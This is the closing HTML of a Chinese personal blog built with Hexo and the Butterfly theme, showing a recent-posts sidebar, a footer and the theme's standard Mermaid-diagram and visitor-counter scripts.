onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实训周"/></a><div class="content"><a class="title" href="/2024/11/02/2024-11-02/" title="实训周">实训周</a><time datetime="2024-11-01T16:00:00.000Z" title="发表于 2024-11-02 00:00:00">2024-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/22/2024-09-22/" title="应急响应"><img src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应"/></a><div class="content"><a class="title" href="/2024/09/22/2024-09-22/" title="应急响应">应急响应</a><time datetime="2024-09-21T16:00:00.000Z" title="发表于 2024-09-22 00:00:00">2024-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/13/2024-09-13/" title="无题"><img src="https://s2.loli.net/2024/07/11/hkNDJcFqupasnZV.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/09/13/2024-09-13/" title="无题">无题</a><time datetime="2024-09-12T16:00:00.000Z" title="发表于 2024-09-13 00:00:00">2024-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/09/2024-09-09/" title="简历"><img src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简历"/></a><div class="content"><a class="title" href="/2024/09/09/2024-09-09/" title="简历">简历</a><time datetime="2024-09-08T16:00:00.000Z" title="发表于 2024-09-09 00:00:00">2024-09-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 仰泳鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
